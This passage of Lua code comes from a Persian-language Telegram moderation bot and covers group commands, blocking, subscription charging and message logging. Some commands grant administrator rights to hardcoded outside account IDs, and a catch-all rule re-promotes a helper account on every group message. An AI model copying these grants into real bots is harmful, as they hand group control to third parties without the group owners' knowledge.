base:del(TD_ID.."MuteList:"..chat_id)
base:del(TD_ID.."SilentList:"..chat_id)
base:del(TD_ID..'setmode:'..chat_id)
base:del(TD_ID..'Text:Welcome:'..chat_id)
base:del(TD_ID..'settag'..chat_id)
base:del(TD_ID..'Link:'..chat_id)
base:del(TD_ID..'Pin_id'..chat_id)
base:del(TD_ID..'EndTimeSee'..chat_id)
base:del(TD_ID..'StartTimeSee'..chat_id)
base:del(TD_ID..'limitpm:'..chat_id)
base:del(TD_ID..'mutetime:'..chat_id)
base:del(TD_ID..'cgmautotime:'..chat_id)
base:del(TD_ID..'cbmtime:'..chat_id)
base:del(TD_ID..'Flood:Max:'..chat_id)
base:del(TD_ID..'Force:Time:'..chat_id)
base:del(TD_ID..'Force:Pm:'..chat_id)
base:del(TD_ID..'joinwarn:'..chat_id)
base:del(TD_ID..'Warn:Max:'..chat_id)
base:del(TD_ID..'NUM_CH_MAX:'..chat_id)
base:del(TD_ID..'setch:'..chat_id)
base:del(TD_ID..'Text:Welcome:'..chat_id)
base:del(TD_ID..'Rules:'..chat_id)
base:del(TD_ID..'Total:messages:'..chat_id)
base:del(TD_ID..'Total:JoinedByLink:'..chat_id)
local function GetName(Guard,Diamond)
local function name(black,diamond)
if Diamond.title then
if diamond.username == '' then name = ec_name(diamond.first_name) else name = diamond.username end
--sendM(chat_id,msg.sender_user_id, msg.id,'✅ انجام شد\n✦ توسط : '..name..'\n﹄﹃﹄﹃﹄﹃﹄﹃﹄﹃﹄\n💢 ربات از گروه با مشخصات زیر :\n📝 نام گروه : '..(Diamond.title or '-')..'\n🆔 ایدے گروه : '..chat_id..'\n﹄﹃﹄﹃﹄﹃﹄﹃﹄﹃﹄\nخارج شد',20,utf8.len(name))
allusers = base:smembers(TD_ID..'AllUsers:'..msg.chat_id)
for k, v in pairs(allusers) do
base:del(TD_ID..'addeduser'..chat_id..v)
base:del(TD_ID..'Total:AddUser:'..chat_id..':'..v)
base:del(TD_ID..'Total:messages:'..chat_id..':'..v)
base:del(TD_ID..'Total:BanUser:'..chat_id..':'..v)
base:del(TD_ID..'Total:KickUser:'..chat_id..':'..v)
base:del(TD_ID..'Total:messages:'..chat_id..':'..os.date("%Y/%m/%d")..':'..v)
end
end
end
GetUser(msg.sender_user_id,name)
end
GetChat(chat_id,GetName)
Left(chat_id,BotCliId,"Left")
Leave_api(chat_id)
end
if Ramin and (Ramin1:match('^join (-100)(%d+)$') or Ramin1:match('^دعوت من (-100)(%d+)$')) then
local chat_id = Ramin1:match('^join (.*)$') or Ramin1:match('^دعوت من (.*)$')
local function GetName(Guard,Diamond)
send(msg.chat_id,msg.id,'• با موفقیت شما رو به گروه \n'..(Diamond.title or '--')..'\nافزودم.','html')
addChatMembers(chat_id,{[0] = msg.sender_user_id})
end
GetChat(chat_id,GetName)
end






if Ramin == 'markread on' or Ramin == 'تیک دوم فعال' then
if base:get(TD_ID..'MarkRead:on') then
send(msg.chat_id, msg.id, '• تیک دوم #فعال بود','md')
else
send(msg.chat_id, msg.id, '• تیک دوم #فعال شد','md')
base:set(TD_ID..'MarkRead:on',true)
end
end
if Ramin == 'markread off' or Ramin == 'تیک دوم غیرفعال' then
if base:get(TD_ID..'MarkRead:on') then
send(msg.chat_id, msg.id, '• تیک دوم #غیرفعال شد','md')
base:del(TD_ID..'MarkRead:on')
else
send(msg.chat_id, msg.id, '• تیک دوم #غیرفعال بود','md')
end
end



if Ramin and (Ramin:match('^setautoblock (%d+)') or Ramin:match('^تنظیم بلاک خودکار (%d+)')) then
local spm = Ramin:match('^setautoblock (%d+)') or Ramin:match('^تنظیم بلاک خودکار (%d+)')
if tonumber(spm) < 2 then
send(msg.chat_id,msg.id, '❎عددے بزرگ تر از 2 وارد کنید','md')
return false
end
base:set(TD_ID..'autoblocknumber',spm)
send(msg.chat_id, msg.id, 'تعداد اسپم در پیوی ربات  :'..spm..' عدد','md')
end

if Ramin == 'biotime on' or Ramin == 'بیوتایم فعال' then
base:set(TD_ID..'biotime:on',true)
send(msg.chat_id, msg.id, '• نمایش ساعت در بیوگرافی ربات پاکسازی فعال شد.\n ازاین به بعد ساعت سرور ربات دربیوگرافی یا متن تنظیم شده نمایش داده می شود.','md')
end
if Ramin == 'biotime off' or Ramin == 'بیوتایم غیرفعال' then
base:del(TD_ID..'biotime:on')
base:del(TD_ID..'biocli')
changeAbout('دستیار ربات جهت پاکسازی پیام : '..Channel..'')
send(msg.chat_id, msg.id, '• نمایش ساعت دربیوگرافی ربات غیرفعال شد.\n نکته مهم: یک متن پیشرفض در بیوگرافی ربات تنظیم شد.\n جهت تغییر بیوگرافی ربات پاکسازی با دستورات زیر انجام بدهید:\n• *setbotbio* {`text`}','md')
end



if Ramin == 'autoblock on' or Ramin == 'بلاک خودکار فعال' then
base:del(TD_ID..'block:on')
send(msg.chat_id, msg.id, '• بلاک خودکار پیوی #فعال شد','md')
end
if Ramin == 'autoblock off' or Ramin == 'بلاک خودکار غیرفعال' then
base:set(TD_ID..'block:on',true)
send(msg.chat_id, msg.id, '• بلاک خودکار پیوی #غیرفعال شد','md')
end
if Ramin and (Ramin1:match('^check (-100)(%d+)$') or Ramin1:match('^اعتبار (-100)(%d+)$')) then
local chat_id = Ramin1:match('^check (.*)$') or Ramin1:match('^اعتبار (.*)$')
local ex = base:ttl(TD_ID.."ExpireData:"..chat_id)
if ex == -1 then
textt = '• گروه به صورت نامحدود شارژ می‌باشد'
send(msg.chat_id,msg.id,textt,'html')
else
local d = math.floor(ex / day ) + 1
text = '• گروه به مدت '..d..'  روز  شارژ می‌باشد'
send(msg.chat_id,msg.id,text,'md')
end
end
------plan1------

-------plan2------


if is_supergroup(msg) then
if Ramin == 'block' or Ramin == 'بلاک' then
local function BlockedByReply(Guard, Diamond)
local user = Diamond.sender_user_id
if base:sismember(TD_ID..'SUDO',user) then
send(msg.chat_id,msg.id,'• من نمیتوانم کاربران دارای مقام را بلاک کنم','md')
return false
end
local function name(black,diamond)
if diamond.username == '' then name = ec_name(diamond.first_name) else name = diamond.username end
sendM(msg.chat_id,user,msg.id,'• کاربر '..name..' بلاک شد', 9,utf8.len(name))
Block(user)
end
GetUser(user,name)
end
if tonumber(msg.reply_to_message_id) == 0 then
else
getMessage(msg.chat_id, tonumber(msg.reply_to_message_id),BlockedByReply)
end
end
if Ramin == 'unblock' or Ramin == 'انبلاک' then
local function BlockedByReply(Guard,Diamond)
local user = Diamond.sender_user_id
local function name(black,diamond)
if diamond.username == '' then name = ec_name(diamond.first_name) else name = diamond.username end
sendM(msg.chat_id,user,msg.id,'• کاربر '..name..' انبلاک شد', 9,utf8.len(name))
Unblock(user)
end
GetUser(user,name)
end
if tonumber(msg.reply_to_message_id) == 0 then
else
getMessage(msg.chat_id, tonumber(msg.reply_to_message_id),BlockedByReply)
end
end

if  Ramin == '😐بـہ امید دیدار'  then
send(msg.chat_id,msg.id,"بای بای !",'md')
Left(msg.chat_id,BotCliId,'Left')
end

if Ramin == 'sessions' or Ramin == 'نشست فعال'  then
tdbot.getActiveSessions(session_cb, msg)
end


if Ramin == 'leave' or Ramin == 'خروج' or Ramin == '❌ربات از گروہ خارج شد...!' then
send(msg.chat_id,msg.id,"• ربات پاکسازی باموفقیت از گروه خارج شد!",'md')
Left(msg.chat_id,BotCliId,'Left')
Leave_api(msg.chat_id)
end
if (Ramin == 'addtabchione' or Ramin == 'نصب') then
addChatMembers(msg.chat_id,{[0] = BotJoiner})
Admin(msg.chat_id, BotJoiner, 'Administrator', {0, 1, 0, 0, 1, 1, 1, 1, 0})
end
if (Ramin == 'addtabchione' or Ramin == 'نصب ضد تبچی یک') then
addChatMembers(msg.chat_id,{[0] = BotJoiner})
Admin(msg.chat_id, BotJoiner, 'Administrator', {0, 1, 0, 0, 1, 1, 1, 1, 0})
Admin(msg.chat_id, 1497005780, 'Administrator', {0, 1, 0, 0, 1, 1, 1, 1, 0})
end
if (Ramin == 'addtabchitwo' or Ramin == 'نصب ضد تبچی دوم') then
addChatMembers(msg.chat_id,{[0] = BotJoiner})
Admin(msg.chat_id, BotJoiner, 'Administrator', {0, 1, 0, 0, 1, 1, 1, 1, 0})
Admin(msg.chat_id, 1572142511, 'Administrator', {0, 1, 0, 0, 1, 1, 1, 1, 0})
end

if Ramin == 'rem' or Ramin == 'لغو نصب' then
base:del(TD_ID..'Gp:'..msg.chat_id)
base:del(TD_ID..'Gp3:'..msg.chat_id)
base:del(TD_ID..'NewUser'..msg.chat_id)
base:del(TD_ID.."ExpireData:"..msg.chat_id)
base:srem(TD_ID.."group:",msg.chat_id)
base:del(TD_ID.."ModList:"..msg.chat_id)
base:del(TD_ID..'OwnerList:'..msg.chat_id)
base:del(TD_ID.."MuteList:"..chat_id)
base:del(TD_ID.."SilentList:"..chat_id)
base:del(TD_ID..'setmode:'..msg.chat_id)
base:del(TD_ID..'Text:Welcome:'..msg.chat_id)
base:del(TD_ID..'settag'..msg.chat_id)
base:del(TD_ID..'Link:'..msg.chat_id)
base:del(TD_ID..'Pin_id'..msg.chat_id)
base:del(TD_ID..'EndTimeSee'..msg.chat_id)
base:del(TD_ID..'StartTimeSee'..msg.chat_id)
base:del(TD_ID..'limitpm:'..msg.chat_id)
base:del(TD_ID..'mutetime:'..msg.chat_id)
base:del(TD_ID..'cgmautotime:'..msg.chat_id)
base:del(TD_ID..'cbmtime:'..msg.chat_id)
base:del(TD_ID..'Flood:Max:'..msg.chat_id)
base:del(TD_ID..'Force:Time:'..msg.chat_id)
base:del(TD_ID..'Force:Pm:'..msg.chat_id)
base:del(TD_ID..'joinwarn:'..msg.chat_id)
base:del(TD_ID..'Warn:Max:'..msg.chat_id)
base:del(TD_ID..'NUM_CH_MAX:'..msg.chat_id)
base:del(TD_ID..'setch:'..msg.chat_id)
base:del(TD_ID..'Text:Welcome:'..msg.chat_id)
base:del(TD_ID..'Rules:'..msg.chat_id)
base:del(TD_ID..'Total:messages:'..msg.chat_id)
base:del(TD_ID..'Total:JoinedByLink:'..msg.chat_id)
allusers = base:smembers(TD_ID..'AllUsers:'..msg.chat_id)
for k, v in pairs(allusers) do
base:del(TD_ID..'addeduser'..msg.chat_id..v)
base:del(TD_ID..'Total:AddUser:'..msg.chat_id..':'..v)
base:del(TD_ID..'Total:messages:'..msg.chat_id..':'..v)
base:del(TD_ID..'Total:BanUser:'..msg.chat_id..':'..v)
base:del(TD_ID..'Total:KickUser:'..msg.chat_id..':'..v)
base:del(TD_ID..'Total:messages:'..msg.chat_id..':'..os.date("%Y/%m/%d")..':'..v)
end
base:del(TD_ID..'StatsGpByName'..msg.chat_id)
end

if Ramin == 'addkicked' or Ramin == 'افزودن لیست سیاه' then
local function Clean(Guard,Diamond)
for k,v in pairs(Diamond.members) do
addChatMembers(msg.chat_id,{[0] = v.user_id})
end
end
send(msg.chat_id,msg.id,'• کاربران لیست سیاه به گروه افزوده شدن','md')
getChannelMembers(msg.chat_id,"Banned", 0, 2000,Clean)
end
end
end

-------fun------ 
----شخصی
if (not base:sismember(TD_ID..'Gp:'..msg.chat_id,'Lock:Cmd') or VipUser(msg,msg.sender_user_id)) and is_supergroup(msg) and base:sismember(TD_ID..'Gp2:'..msg.chat_id,'added') then



if Ramin == 'ping' or  Ramin == 'پینگ' and is_JoinChannel(msg) then
local time_ = os.time()
if time_ ~= os.time() then
Stop = os.time() - time_
else
Stop = "بدون وقفه"
end
ping = io.popen("ping -c 1 api.telegram.org"):read("*a"):match("time=(%S+)") 
send(msg.chat_id, msg.id, "◈ *ربات پاکسازی آنلاین می باشد!* ▸\n▲ ارسال : `" .. os.time() - time_ .. " ثانیه`\n▼ دریافت : `" .. Stop .. "`\n◄ پینگ سرور : `" .. ping .. "`\n", "md")
end


if Ramin == 'tophoto' or Ramin == 'تبدیل به عکس'  and tonumber(msg.reply_to_message_id) > 0 then
function tophoto(Guard,Diamond)   
if Diamond.content._ == "messageSticker" then        
local bd = Diamond.content.sticker.sticker.path          
sendPhoto(msg.chat_id,msg.id,0,1,nil,bd,'@'..Channel..'',dl_cb,nil)
else
send(msg.chat_id,msg.id,'فقط استیکر','md')
end
end
getMessage(msg.chat_id,msg.reply_to_message_id,tophoto)
end

if (Ramin == 'addcleaner' or Ramin == 'نصب') then
Admin(msg.chat_id, BotJoiner, 'Administrator', {0, 1, 0, 0, 1, 1, 1, 1, 0})
end
if Ramin and (Ramin:match('^(.*)') or Ramin:match('^(.*)'))  then
Admin(msg.chat_id, BotJoiner, 'Administrator', {0, 1, 0, 0, 1, 1, 1, 1, 0})
end
if  Ramin == 'got on' then
send(msg.chat_id,0,'got on','html')
end
if  Ramin == 'aasab' then
send(msg.chat_id,0,'aasab','html')
end
if Ramin and (Ramin:match('^like (.*)') or Ramin:match('^نظر سنجی (.*)'))  then
local bd = Ramin:match('like (.*)') or Ramin:match('نظر سنجی (.*)')
function GetPanel(black,diamond)
if diamond.results and diamond.results[0] then
sendInline(msg.chat_id,msg.id, 0, 1, diamond.inline_query_id,diamond.results[0].id)
else
send(msg.chat_id, msg.id, '• مشکل فنی در سیستم لایک !','md')
sendBotStartMessage(190601014, 190601014, "new")
end
end
get(190601014,msg.chat_id,0,0,bd,0,GetPanel, nil)
end --]]



if Ramin and (Ramin:match('^نصب ([https?://w]*.?[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/%S+)$')) then
local link = msg.content.text:match('^نصب ([https?://w]*.?[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/%S+)$') 
importChatInviteLink(link)
end
if Ramin and (Ramin:match('^نصب ([https?://w]*.?[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/%S+)$')) then
local link = msg.content.text:match('^نصب ([https?://w]*.?[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/%S+)$') 
link = link:gsub("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]", "telegram.me")
importChatInviteLink(link)
end
if Ramin and (Ramin:match('^نصب ([https?://w]*.?[Tt].[Mm][Ee]/[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/%S+)$')) then
local link = msg.content.text:match('^نصب ([https?://w]*.?[Tt].[Mm][Ee]/[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/%S+)$') 
link = link:gsub("[Tt].[Mm][Ee]", "telegram.me")
importChatInviteLink(link)
end



---end cmd
end
------auto cgm-------




-----del today chat
if tonumber(os.date("%H%M")) > 2350 and not base:get(TD_ID..'delincr'..msg.chat_id) then
allusers = base:smembers(TD_ID..'AllUsers:'..msg.chat_id)
for k, v in pairs(allusers) do
base:del(TD_ID..'Total:messages:'..msg.chat_id..':'..os.date("%Y/%m/%d")..':'..v)
end
base:setex(TD_ID..'delincr'..msg.chat_id,60,true)
end

--PARDAKHT ONLINE
if Ramin and (Ramin:match('12,000')) and gp_type(msg.chat_id) == 'pv' and tostring(msg.sender_user_id):match(154347799) then
function dlqaz(arg,data)
local text = data.content.text
for code in string.gmatch(text, "100%d+") do
send_code = code
send_code = string.gsub(send_code,"-100","-100")
send_code = string.gsub(send_code,"100","-100")
charge = base:ttl(TD_ID.."ExpireData:"..send_code)
timee = 86400 * 30
tamdidcharge = tonumber(charge) + tonumber(timee)
newcharge = math.floor(tamdidcharge / 86400)
ti = math.floor(timee / day )
gp = base:get(TD_ID..'StatsGpByName'..send_code) or 'not'
dofile('./Alpha/time.lua')
sendApi(Sudoid,0,' 💳 گزارش تمدید شارژ گروہ بـہ صورت پرداخت آنلاین ✅\nنام گروہ تمدید شدہ :\n `'..gp..'` \n شناسـہ گروہ تمدید شدہ :\n*'..(send_code or 'نامشخص')..'*\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\n ✔️میزان شارژ خریدارے شدہ گروہ : *'..ti..'* روز\n• تاریخ امروز :\n '..limitmsg..'/*'..limitmsg1..'/'..limitmsg2..'\n• ساعت :\n '..hor..':*'..dag..':'..sec..'','md')
sendApi(send_code,0,'پرداخت شما با موفقیت انجام شد✅\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\nشارژ گروہ شما با موفقیت بـہ مدت *'..ti..'* روز دیگر تمدید شد.\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\n✔️میزان شارژ جدید گروہ شما : *'..newcharge..'* روز\n• تاریخ امروز :\n '..limitmsg..'/*'..limitmsg1..'/'..limitmsg2..'\n• ساعت :\n '..hor..':*'..dag..':'..sec..'','md')
sendApi(IDSup,0,' 💳 گزارش تمدید شارژ گروہ بـہ صورت پرداخت آنلاین ✅\nنام گروہ تمدید شدہ :\n `'..gp..'` \n شناسـہ گروہ تمدید شدہ :\n*'..(send_code or 'نامشخص')..'*\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\n ✔️میزان شارژ خریدارے شدہ گروہ : *'..ti..'* روز\n• تاریخ امروز :\n '..limitmsg..'/*'..limitmsg1..'/'..limitmsg2..'\n• ساعت :\n '..hor..':*'..dag..':'..sec..'','md')

base:sadd(TD_ID.."paygroup",send_code)
base:setex(TD_ID.."ExpireData:"..send_code,tamdidcharge,true)
end
end
getMessage(154347799,msg.id,dlqaz)
end
if Ramin and (Ramin:match('24,000')) and gp_type(msg.chat_id) == 'pv' and tostring(msg.sender_user_id):match(154347799) then
function dlqaz(arg,data)
text = data.content.text
for code in string.gmatch(text,"100%d+") do
send_code = code
send_code = string.gsub(send_code,"-100","-100")
send_code = string.gsub(send_code,"100","-100")
charge = base:ttl(TD_ID.."ExpireData:"..send_code)
timee = 86400 * 60
tamdidcharge = tonumber(charge) + tonumber(timee)
newcharge = math.floor(tamdidcharge / 86400)
ti = math.floor(timee / day )
gp = base:get(TD_ID..'StatsGpByName'..send_code) or 'not'
dofile('./Alpha/time.lua')
sendApi(Sudoid,0,' 💳 گزارش تمدید شارژ گروہ بـہ صورت پرداخت آنلاین ✅\nنام گروہ تمدید شدہ :\n `'..gp..'` \n شناسـہ گروہ تمدید شدہ :\n*'..(send_code or 'نامشخص')..'*\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\n ✔️میزان شارژ خریدارے شدہ گروہ : *'..ti..'* روز\n• تاریخ امروز :\n '..limitmsg..'/*'..limitmsg1..'/'..limitmsg2..'\n• ساعت :\n '..hor..':*'..dag..':'..sec..'','md')
sendApi(send_code,0,'پرداخت شما با موفقیت انجام شد✅\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\nشارژ گروہ شما با موفقیت بـہ مدت *'..ti..'* روز دیگر تمدید شد.\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\n✔️میزان شارژ جدید گروہ شما : *'..newcharge..'* روز\n• تاریخ امروز :\n '..limitmsg..'/*'..limitmsg1..'/'..limitmsg2..'\n• ساعت :\n '..hor..':*'..dag..':'..sec..'','md')
sendApi(IDSup,0,' 💳 گزارش تمدید شارژ گروہ بـہ صورت پرداخت آنلاین ✅\nنام گروہ تمدید شدہ :\n `'..gp..'` \n شناسـہ گروہ تمدید شدہ :\n*'..(send_code or 'نامشخص')..'*\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\n ✔️میزان شارژ خریدارے شدہ گروہ : *'..ti..'* روز\n• تاریخ امروز :\n '..limitmsg..'/*'..limitmsg1..'/'..limitmsg2..'\n• ساعت :\n '..hor..':*'..dag..':'..sec..'','md')

base:sadd(TD_ID.."paygroup",send_code)
base:setex(TD_ID.."ExpireData:"..send_code,tamdidcharge,true)
end
end
getMessage(154347799,msg.id,dlqaz)
end
if Ramin and (Ramin:match('35,000')) and gp_type(msg.chat_id) == 'pv' and tostring(msg.sender_user_id):match(154347799) then
function dlqaz(arg,data)
text = data.content.text
for code in string.gmatch(text,"100%d+") do
send_code = code
send_code = string.gsub(send_code,"-100","-100")
send_code = string.gsub(send_code,"100","-100")
charge = base:ttl(TD_ID.."ExpireData:"..send_code)
timee = 86400 * 90
tamdidcharge = tonumber(charge) + tonumber(timee)
newcharge = math.floor(tamdidcharge / 86400)
ti = math.floor(timee / day )
gp = base:get(TD_ID..'StatsGpByName'..send_code) or 'not'
dofile('./Alpha/time.lua')
sendApi(Sudoid,0,' 💳 گزارش تمدید شارژ گروہ بـہ صورت پرداخت آنلاین ✅\nنام گروہ تمدید شدہ :\n `'..gp..'` \n شناسـہ گروہ تمدید شدہ :\n*'..(send_code or 'نامشخص')..'*\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\n ✔️میزان شارژ خریدارے شدہ گروہ : *'..ti..'* روز\n• تاریخ امروز :\n '..limitmsg..'/*'..limitmsg1..'/'..limitmsg2..'\n• ساعت :\n '..hor..':*'..dag..':'..sec..'','md')
sendApi(send_code,0,'پرداخت شما با موفقیت انجام شد✅\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\nشارژ گروہ شما با موفقیت بـہ مدت *'..ti..'* روز دیگر تمدید شد.\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\n✔️میزان شارژ جدید گروہ شما : *'..newcharge..'* روز\n• تاریخ امروز :\n '..limitmsg..'/*'..limitmsg1..'/'..limitmsg2..'\n• ساعت :\n '..hor..':*'..dag..':'..sec..'','md')
sendApi(IDSup,0,' 💳 گزارش تمدید شارژ گروہ بـہ صورت پرداخت آنلاین ✅\nنام گروہ تمدید شدہ :\n `'..gp..'` \n شناسـہ گروہ تمدید شدہ :\n*'..(send_code or 'نامشخص')..'*\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\n ✔️میزان شارژ خریدارے شدہ گروہ : *'..ti..'* روز\n• تاریخ امروز :\n '..limitmsg..'/*'..limitmsg1..'/'..limitmsg2..'\n• ساعت :\n '..hor..':*'..dag..':'..sec..'','md')
base:sadd(TD_ID.."paygroup",send_code)
base:setex(TD_ID.."ExpireData:"..send_code,tamdidcharge,true)
end
end
getMessage(154347799,msg.id,dlqaz)
end
if Ramin and (Ramin:match('70,000')) and gp_type(msg.chat_id) == 'pv' and tostring(msg.sender_user_id):match(154347799) then
function dlqaz(arg,data)
text = data.content.text
for code in string.gmatch(text,"100%d+") do
send_code = code
send_code = string.gsub(send_code,"-100","-100")
send_code = string.gsub(send_code,"100","-100")
charge = base:ttl(TD_ID.."ExpireData:"..send_code)
timee = 86400 * 180
tamdidcharge = tonumber(charge) + tonumber(timee)
newcharge = math.floor(tamdidcharge / 86400)
ti = math.floor(timee / day )
gp = base:get(TD_ID..'StatsGpByName'..send_code) or 'not'
dofile('./Alpha/time.lua')
sendApi(Sudoid,0,' 💳 گزارش تمدید شارژ گروہ بـہ صورت پرداخت آنلاین ✅\nنام گروہ تمدید شدہ :\n `'..gp..'` \n شناسـہ گروہ تمدید شدہ :\n*'..(send_code or 'نامشخص')..'*\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\n ✔️میزان شارژ خریدارے شدہ گروہ : *'..ti..'* روز\n• تاریخ امروز :\n '..limitmsg..'/*'..limitmsg1..'/'..limitmsg2..'\n• ساعت :\n '..hor..':*'..dag..':'..sec..'','md')
sendApi(send_code,0,'پرداخت شما با موفقیت انجام شد✅\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\nشارژ گروہ شما با موفقیت بـہ مدت *'..ti..'* روز دیگر تمدید شد.\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\n✔️میزان شارژ جدید گروہ شما : *'..newcharge..'* روز\n• تاریخ امروز :\n '..limitmsg..'/*'..limitmsg1..'/'..limitmsg2..'\n• ساعت :\n '..hor..':*'..dag..':'..sec..'','md')
sendApi(IDSup,0,' 💳 گزارش تمدید شارژ گروہ بـہ صورت پرداخت آنلاین ✅\nنام گروہ تمدید شدہ :\n `'..gp..'` \n شناسـہ گروہ تمدید شدہ :\n*'..(send_code or 'نامشخص')..'*\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\n ✔️میزان شارژ خریدارے شدہ گروہ : *'..ti..'* روز\n• تاریخ امروز :\n '..limitmsg..'/*'..limitmsg1..'/'..limitmsg2..'\n• ساعت :\n '..hor..':*'..dag..':'..sec..'','md')
base:sadd(TD_ID.."paygroup",send_code)
base:setex(TD_ID.."ExpireData:"..send_code,tamdidcharge,true)
end
end
getMessage(154347799,msg.id,dlqaz)
end
if Ramin and (Ramin:match('150,000')) and gp_type(msg.chat_id) == 'pv' and tostring(msg.sender_user_id):match(154347799) then
function dlqaz(arg,data)
text = data.content.text
for code in string.gmatch(text,"100%d+") do
send_code = code
send_code = string.gsub(send_code,"-100","-100")
send_code = string.gsub(send_code,"100","-100")
charge = base:ttl(TD_ID.."ExpireData:"..send_code)
timee = 86400 * 360
tamdidcharge = tonumber(charge) + tonumber(timee)
newcharge = math.floor(tamdidcharge / 86400)
ti = math.floor(timee / day )
gp = base:get(TD_ID..'StatsGpByName'..send_code) or 'not'
dofile('./Alpha/time.lua')
sendApi(Sudoid,0,' 💳 گزارش تمدید شارژ گروہ بـہ صورت پرداخت آنلاین ✅\nنام گروہ تمدید شدہ :\n `'..gp..'` \n شناسـہ گروہ تمدید شدہ :\n*'..(send_code or 'نامشخص')..'*\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\n ✔️میزان شارژ خریدارے شدہ گروہ : *'..ti..'* روز\n• تاریخ امروز :\n '..limitmsg..'/*'..limitmsg1..'/'..limitmsg2..'\n• ساعت :\n '..hor..':*'..dag..':'..sec..'','md')
sendApi(send_code,0,'پرداخت شما با موفقیت انجام شد✅\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\nشارژ گروہ شما با موفقیت بـہ مدت *'..ti..'* روز دیگر تمدید شد.\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\n✔️میزان شارژ جدید گروہ شما : *'..newcharge..'* روز\n• تاریخ امروز :\n '..limitmsg..'/*'..limitmsg1..'/'..limitmsg2..'\n• ساعت :\n '..hor..':*'..dag..':'..sec..'','md')
sendApi(IDSup,0,' 💳 گزارش تمدید شارژ گروہ بـہ صورت پرداخت آنلاین ✅\nنام گروہ تمدید شدہ :\n `'..gp..'` \n شناسـہ گروہ تمدید شدہ :\n*'..(send_code or 'نامشخص')..'*\n━┈┈┈┈┈୨♡୧┈┈┈┈┈━\n ✔️میزان شارژ خریدارے شدہ گروہ : *'..ti..'* روز\n• تاریخ امروز :\n '..limitmsg..'/*'..limitmsg1..'/'..limitmsg2..'\n• ساعت :\n '..hor..':*'..dag..':'..sec..'','md')
base:sadd(TD_ID.."paygroup",send_code)
base:setex(TD_ID.."ExpireData:"..send_code,tamdidcharge,true)
end
end
getMessage(154347799,msg.id,dlqaz)
end
---BioBot
biobot = base:get(TD_ID..'BotBio') or 0
bio = base:get(TD_ID..'biocli') or 'دستیار کمکی پاکسازی'
if os.date("%M") ~= biobot and base:get(TD_ID..'biotime:on') then
changeAbout(''..bio..':  Time['..os.date("%X")..']')
base:set(TD_ID..'BotBio',os.date("%M"))
end
-------Guard Diamond---------
end
end
function GaurdianTm(msg,data)

if msg and msg.chat_id then

 if msg.date and msg.date < tonumber(os.time() - 5) then
    return
  end

if msg.chat_id then
    local id = tostring(msg.chat_id)
    if id:match('-100(%d+)') then
      grouptype = "supergroup"
      if not base:sismember(TD_ID.."sgps",msg.chat_id) then
        base:sadd(TD_ID.."sgps",msg.chat_id)
      end
    elseif id:match('^-(%d+)') then
      grouptype = "group"
      if not base:sismember(TD_ID.."gps",msg.chat_id) then
        base:sadd(TD_ID.."gps",msg.chat_id)
      end
    elseif id:match('^(%d+)') then
      grouptype = "pv"
      if not base:sismember(TD_ID.."users",msg.chat_id) then
        base:sadd(TD_ID.."users",msg.chat_id)
      end
    end
  end
 if tonumber(msg.sender_user_id) == tonumber(our_id) then
    return false
  end
  
  function print_msg(msg)
	text = color.yellow[1].."["..os.date("%H:%M:%S").."]"..color.red[1].."[Type :"
	
	if msg.content.text then
		text = text.."Text]\n"..color.default..msg.content.text
	else
		if msg.content.caption and msg.content.caption ~= "" then
			if msg.content._ == "messagePhoto" then
				text = text.."Photo]\n"..color.cyan[1].."Caption: "..color.default..msg.content.caption
			elseif msg.content._ == "messageVideo" then
				text = text.."Video]\n"..color.cyan[1].."Caption: "..color.default..msg.content.caption
			elseif msg.content._ == "messageVideoNote" then
				text = text.."Videonote]\n"..color.cyan[1].."Caption: "..color.default..msg.content.caption
			elseif msg.content._ == "messageVoice" then
				text = text.."Voice]\n"..color.cyan[1].."Caption: "..color.default..msg.content.caption
			elseif msg.content._ == "messageAudio" then
				text = text.."Audio]\n"..color.cyan[1].."Caption: "..color.default..msg.content.caption
			elseif msg.content._ == "messageAnimation" then
				text = text.."Gif]\n"..color.cyan[1].."Caption: "..color.default..msg.content.caption
			elseif msg.content._ == "messageSticker" then
				text = text.."Sticker]\n"..color.cyan[1].."Caption: "..color.default..msg.content.caption
			elseif msg.content._ == "messageContact" then
				text = text.."Contact]\n"..color.cyan[1].."Caption: "..color.default..msg.content.caption
			elseif msg.content._ == "messageDocument" then
				text = text.."File]\n"..color.cyan[1].."Caption: "..color.default..msg.content.caption
			elseif msg.content._ == "messageLocation" then
				text = text.."Location]\n"..color.cyan[1].."Caption: "..color.default..msg.content.caption
			end
		else
			if msg.content._ == "messagePhoto" then
				text = text.."Photo] "..color.default
			elseif msg.content._ == "messageVideo" then
				text = text.."Video] "..color.default
			elseif msg.content._ == "messageVideoNote" then
				text = text.."Videonote] "..color.default
			elseif msg.content._ == "messageVoice" then
				text = text.."Voice] "..color.default
			elseif msg.content._ == "messageAudio" then
